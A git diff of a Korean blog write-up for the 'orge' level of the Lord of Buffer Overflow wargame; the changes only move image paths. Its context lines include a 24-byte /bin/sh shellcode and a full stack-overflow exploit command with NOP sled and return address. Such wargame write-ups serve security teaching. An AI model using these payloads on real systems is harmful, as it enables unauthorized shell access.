@@ -85,13 +85,13 @@ argv[0]의 길이가 77이여야 한는 코드가 추가되었다.
 
 argv[0]는 파일실행경로값이 들어가게 된다.
 
-<img src="http://eliez3r.synology.me/assets/img/writeup/lob/07.orge/01.png" width="600px">{:.rounded.shadow}
+<img src="http://eliez3r.synology.me/assets/blog/writeup/lob/07.orge/01.png" width="600px">{:.rounded.shadow}
 
 <br> 
 
 shell에는 다음과 같은 기능(?)이 있다.
 
-<img src="http://eliez3r.synology.me/assets/img/writeup/lob/07.orge/02.png" width="600px">{:.rounded.shadow}
+<img src="http://eliez3r.synology.me/assets/blog/writeup/lob/07.orge/02.png" width="600px">{:.rounded.shadow}
 
 경로명에 '/'를 여러개 넣어도 1개로 인식하여 파일이 실행된다. 하지만 argv[0]의 길이는 늘어나는 셈이다.  
 이를 이용하여 길이를 77바이트로 만들면 될것 같다.
@@ -112,9 +112,9 @@ shell에는 다음과 같은 기능(?)이 있다.
 
 core 덤프를 떨궈 shellcode가 들어갈 argv[2]의 주소를 구하자.
 
-<img src="http://eliez3r.synology.me/assets/img/writeup/lob/07.orge/03.png" width="850px">{:.rounded.shadow}
+<img src="http://eliez3r.synology.me/assets/blog/writeup/lob/07.orge/03.png" width="850px">{:.rounded.shadow}
 
-<img src="http://eliez3r.synology.me/assets/img/writeup/lob/07.orge/04.png" width="650px">{:.rounded.shadow}
+<img src="http://eliez3r.synology.me/assets/blog/writeup/lob/07.orge/04.png" width="650px">{:.rounded.shadow}
 
 이제 쉘코드를 넣고 RET주소에 0xbffffb64 를 넣으면 끄읏~
 
@@ -124,7 +124,7 @@ core 덤프를 떨궈 shellcode가 들어갈 argv[2]의 주소를 구하자.
 shell(24byte) = \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
 ```
 
-<img src="http://eliez3r.synology.me/assets/img/writeup/lob/07.orge/05.png" width="850px">{:.rounded.shadow}
+<img src="http://eliez3r.synology.me/assets/blog/writeup/lob/07.orge/05.png" width="850px">{:.rounded.shadow}
 
 ```shell
 [darkelf@localhost darkelf]$ /home/darkelf////////////////////////////////////////////////////////////orge `python -c 'print "A"*44+"\x64\xfb\xff\xbf"'` `python -c 'print "\x90"*50+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"'`
